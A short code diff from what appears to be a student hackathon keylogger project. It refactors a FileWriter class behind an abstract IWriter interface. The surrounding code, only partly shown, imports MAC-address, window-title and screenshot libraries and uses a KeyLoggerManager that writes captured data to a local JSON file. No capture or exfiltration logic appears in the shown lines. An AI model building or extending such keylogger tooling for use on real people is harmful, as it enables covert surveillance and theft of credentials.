@@ -6,7 +6,12 @@ import  json
 from getmac import get_mac_address
 import win32gui
 from PIL import ImageGrab
+from abc import ABC, abstractmethod
 
+class IWriter(ABC):
+    @abstractmethod
+    def write(self, data):
+        pass
 
 class Encryptor:
     @staticmethod
@@ -128,9 +133,9 @@ import os
 
 
 
-class FileWriter:
-    @staticmethod
-    def write_to_file(data:dict):
+class FileWriter(IWriter):
+
+    def write(self, data):
         with open(r"C:\Users\matan\kodkod\programming\Hackathon_KeyLoger_agent\new_projecct\matanya alkobi\output.json" , "a" , encoding="utf-8") as file:
             if data:
                 json.dump(data , file ,ensure_ascii=False,  indent=4)
@@ -145,7 +150,7 @@ class KeyLoggerManager:
         self.instance.start()
 
     def write_to_file(self):
-        FileWriter.write_to_file(self.instance.get_data())
+        FileWriter().write(self.instance.get_data())
 
     def main(self):
         threading.Thread(target=self.start).start()
